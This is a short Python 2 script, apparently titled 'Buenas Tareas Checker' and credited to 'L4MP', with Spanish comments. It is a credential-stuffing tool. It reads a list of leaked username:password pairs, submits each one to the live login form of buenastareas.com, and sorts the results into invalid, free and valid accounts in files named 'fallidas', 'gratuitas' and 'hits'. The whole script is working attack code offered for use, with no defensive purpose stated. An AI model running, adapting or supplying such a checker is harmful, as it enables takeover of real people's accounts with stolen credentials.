#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Importamos los modulos necesarios.
import requests
import os
import time

print("\x1b[1;31m"+" ▄▄▄▄   ▄▄▄█████▓ ▄████▄  ")
print("\x1b[1;31m"+"▓█████▄ ▓  ██▒ ▓▒▒██▀ ▀█  ")
print("\x1b[1;31m"+"▒██▒ ▄██▒ ▓██░ ▒░▒▓█    ▄ ")
print("\x1b[1;31m"+"▒██░█▀  ░ ▓██▓ ░ ▒▓▓▄ ▄██▒")
print("\x1b[1;31m"+"░▓█  ▀█▓  ▒██▒ ░ ▒ ▓███▀ ░")
print("\x1b[1;31m"+"░▒▓███▀▒  ▒ ░░   ░ ░▒ ▒  ░")
print("\x1b[1;31m"+"▒░▒   ░     ░      ░  ▒   ")
print("\x1b[1;31m"+" ░    ░   ░      ░        ")
print("\x1b[1;31m"+" ░               ░ ░      ") 
print("\x1b[1;31m"+"      ░          ░        ")
print("\x1b[1;33m"+"===Buenas Tareas Checker===")
c = open(raw_input("\x1b[1;35m"+'Ingrese el combo:'),"r")
os.system('clear')
print("\x1b[1;32m"+"Iniciando Checker...")

time.sleep(2)

os.system('clear')

stop = "default"

archivo = [s.rstrip()for s in c.readlines()]#leemos las cuentas en el archivo

for lines in archivo:#creamos un bucle para leer las cuentas contenidas en el combo
	combo = lines.split(":")
	data = {'username':combo[0],'password':combo[1]}
	try:

		r = requests.post("https://www.buenastareas.com/login.php", data=data)# Realizamos una peticion POST con los datos
		
		if "Ingresa en tu cuenta " in r.content:
			print("\x1b[1;31m"+"Cuenta Invalida:")
			print "\x1b[1;31m"+combo[0],combo[1]
			h = open ("fallidas.txt", "a")
			h.write(combo[0]+":"+combo[1]+"\n")

		elif "¡Ingresa ahora!" in r.content:
			print("\x1b[1;33m"+"Cuenta Gratuita:")
			print "\x1b[1;33m"+combo[0],combo[1]
			g = open ("gratuitas.txt", "a")
			g.write(combo[0]+":"+combo[1]+"\n")

		else:
			print("\x1b[1;32m"+"=============================================")
			print("\x1b[1;32m"+"Cuenta Valida:")
			print combo[0],combo[1]
			print("\x1b[1;32m"+"=============================================")
			f = open ("hits.txt", "a")
			f.write(combo[0]+":"+combo[1]+"\n")
	except KeyboardInterrupt:
		os.system('clear')
		print("\x1b[1;37m"+ "Gracias por utilizar BTC (by L4MP)  ")
		break
	if stop in combo[0]:
		break
